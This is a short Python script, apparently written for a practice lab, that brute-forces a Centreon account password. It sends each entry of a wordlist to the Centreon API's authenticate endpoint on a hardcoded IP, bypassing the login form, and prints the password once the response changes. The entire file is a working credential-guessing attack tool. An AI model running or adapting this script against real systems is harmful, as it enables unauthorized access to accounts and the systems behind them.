# This file attempts to crack a centreon password using
# a given wordlist, uses the API *Not the login form*
# Frank Cerny
# 11/26/2019

import sys
from pathlib import Path
from requests import post

if len(sys.argv) < 3:
    print("Usage python3 centreonPasswordCrack <username> <wordlist_path>")
    exit(0)

count = 0
username = sys.argv[1]
# URL params
params = {"action":"authenticate"}
URL = "http://10.10.10.157/centreon/api/index.php?"

with open(str(sys.argv[2]), "r") as f:
    while f:
        password = f.readline().strip()
        print("Count: {}, Password: {}".format(count, password))
        # Post body content
        data = {"username": username, "password": password}
        response = post(url=URL, params=params, data=data)
        count += 1
        if response.text != '"Bad credentials"':
            print("Found Password: {}. Response: {}".format(password, response.text))
            break

        

